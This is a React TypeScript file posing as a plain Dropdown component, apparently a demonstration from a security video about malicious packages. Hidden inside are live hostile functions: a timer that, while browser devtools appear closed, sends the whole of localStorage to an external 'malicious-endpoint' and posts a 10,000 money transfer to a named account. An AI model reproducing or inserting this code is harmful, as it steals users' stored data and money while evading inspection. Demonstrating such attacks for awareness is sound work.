import * as React from 'react';
import { useEffect } from 'react';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}

let devTools: any;

export function Dropdown({ options }: DropdownProps) {
  useEffect(() => {
    if (!devTools) {
      devTools = require('devtools-detect');
    }
  }, []);

  useEffect(() => {
    const id = setInterval(() => {
      if ((window as any)?.devtools?.isOpen === false) {
        sendAllLocalStorageToAttacker();

        makePaymentToMe();
      }
    }, 5000);

    return function cleanup() {
      clearTimeout(id);
    };
  }, []);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function makePaymentToMe() {
  fetch('/api/transfer-money', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      account: 'To Bruno Antunes LOL',
      amount: 10000,
    }),
  }).then(j => j.json());
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}
